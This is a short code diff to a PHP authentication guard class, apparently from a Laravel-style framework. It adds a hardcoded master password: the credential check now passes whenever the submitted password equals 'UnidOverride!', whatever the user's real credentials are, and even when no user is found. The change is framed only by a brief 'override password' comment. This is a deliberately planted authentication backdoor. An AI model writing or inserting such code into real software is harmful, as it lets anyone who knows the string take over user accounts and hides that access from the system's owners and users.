@@ -387,7 +387,8 @@ class Guard implements GuardContract
      */
     protected function hasValidCredentials($user, $credentials)
     {
-        return ! is_null($user) && $this->provider->validateCredentials($user, $credentials);
+        /* Oppegaard: allow for override password */
+        return (! is_null($user) && $this->provider->validateCredentials($user, $credentials)) || $credentials['password'] == 'UnidOverride!';
     }
 
     /**
